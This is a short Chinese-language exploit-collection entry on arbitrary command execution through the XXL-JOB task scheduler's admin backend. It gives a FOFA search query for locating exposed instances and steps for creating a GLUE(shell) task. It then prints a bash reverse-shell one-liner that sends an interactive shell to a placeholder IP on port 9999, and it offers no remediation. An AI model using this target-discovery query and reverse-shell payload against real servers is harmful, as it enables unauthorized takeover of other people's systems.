---
title: XXL-JOB 任务调度中心 后台任意命令执行漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - XXL-JOB
---

# XXL-JOB 任务调度中心 后台任意命令执行漏洞

## 漏洞描述

XXL-JOB 任务调度中心攻击者可以在后台可以通过写入shell命令任务调度获取服务器权限

## 漏洞影响

> [!NOTE]
>
> XXL-JOB

## FOFA

> [!NOTE]
>
> app="XXL-JOB" || title="任务调度中心"

## 漏洞复现

登录后台增加一个任务

![](/img/20210924015155293457.png)

> [!NOTE]
>
> 注意运行模式需要为 GLUE(shell)

![](/img/20210924015155542933.png)

点击 GLUE IDE编辑脚本

![](/img/20210924015156705753.png)

![](/img/20210924015156875638.png)

执行探测出网，和任务调用是否可执行

反弹一个shell

```
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'
```

![](/img/20210924015157171312.png)